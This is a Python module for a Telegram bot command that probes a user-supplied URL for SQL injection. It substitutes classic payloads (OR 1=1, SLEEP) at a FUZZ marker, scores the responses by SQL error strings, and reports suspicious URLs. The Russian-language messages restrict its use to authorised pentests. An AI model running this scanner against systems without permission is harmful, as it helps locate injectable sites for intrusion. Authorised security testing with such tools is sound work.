# modules/sqli.py
import aiohttp
from urllib.parse import urlparse
from telegram import Update
from telegram.ext import ContextTypes

PAYLOADS = [
    "1",
    "1'",
    "1\"",
    "1' OR '1'='1",
    "1' OR 1=1--",
    "1' OR '1'='1' -- -",
    "1) OR 1=1--",
    "1' AND SLEEP(3)--",
]

SQL_ERROR_KEYWORDS = [
    "SQL syntax",
    "mysql_fetch",
    "You have an error in your SQL syntax",
    "Warning: mysql_",
    "PostgreSQL",
    "PG::SyntaxError",
    "SQLite",
    "ODBC",
    "ORA-",
    "syntax error",
]


async def sqli_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Команда:
        /sqli https://target.com/page.php?id=FUZZ

    В URL ОБЯЗАТЕЛЬНО должно быть слово FUZZ – на его место подставляем payload'ы.
    """
    if not context.args:
        await update.message.reply_text(
            "🔴 SQLiProbe:\n"
            "Нужен URL с параметром FUZZ.\n\n"
            "Пример:\n"
            "/sqli https://testphp.vulnweb.com/listproducts.php?cat=FUZZ"
        )
        return

    raw_url = context.args[0].strip()

    if "FUZZ" not in raw_url:
        await update.message.reply_text(
            "В URL должно быть слово 'FUZZ'.\n\n"
            "Пример:\n"
            "/sqli https://testphp.vulnweb.com/listproducts.php?cat=FUZZ"
        )
        return

    parsed = urlparse(raw_url)
    if not parsed.scheme.startswith("http"):
        await update.message.reply_text("URL должен начинаться с http:// или https://")
        return

    await update.message.reply_text(
        f"🔴 SQLiProbe для:\n{raw_url}\n\n"
        "Подставляю SQL-пэйлоады и ищу подозрительные ответы…\n"
        "Используй только на целях, где у тебя есть разрешение!"
    )

    results = []

    timeout = aiohttp.ClientTimeout(total=12)

    async with aiohttp.ClientSession(timeout=timeout) as session:
        for payload in PAYLOADS:
            test_url = raw_url.replace("FUZZ", payload)

            try:
                async with session.get(test_url, allow_redirects=False) as resp:
                    text = await resp.text(errors="ignore")
                    length = len(text)
                    status = resp.status

            except Exception as e:
                # пропускаем, если не отвечает
                continue

            score = 0

            # 1) статус 200 – уже лучше, чем 404/500
            if status == 200:
                score += 1

            # 2) ключевые слова SQL-ошибок
            lowered = text.lower()
            for keyword in SQL_ERROR_KEYWORDS:
                if keyword.lower() in lowered:
                    score += 5
                    break

            # 3) очень длинные ответы тоже помечаем
            if length > 5000:
                score += 1

            results.append(
                {
                    "payload": payload,
                    "url": test_url,
                    "status": status,
                    "length": length,
                    "score": score,
                }
            )

    if not results:
        await update.message.reply_text("Не удалось получить ответы от цели.")
        return

    # сортируем по score и длине
    results.sort(key=lambda r: (r["score"], r["length"]), reverse=True)

    top = results[:5]

    lines = ["🔥 SQLiProbe отчёт:", f"Проверено payload'ов: {len(results)}", ""]
    lines.append("Ниже самые подозрительные ответы (по убыванию важности):\n")

    for i, r in enumerate(top, start=1):
        lines.append(
            f"{i}. [score={r['score']}] [HTTP {r['status']}] {r['url']}\n"
            f"   Длина ответа: {r['length']}"
        )

    lines.append(
        "\n⚠️ Это только эвристика.\n"
        "Обязательно проверь эти URL вручную в Burp/своими скриптами "
        "и используй только в рамках легального pentest/bug bounty."
    )

    await update.message.reply_text("\n".join(lines))
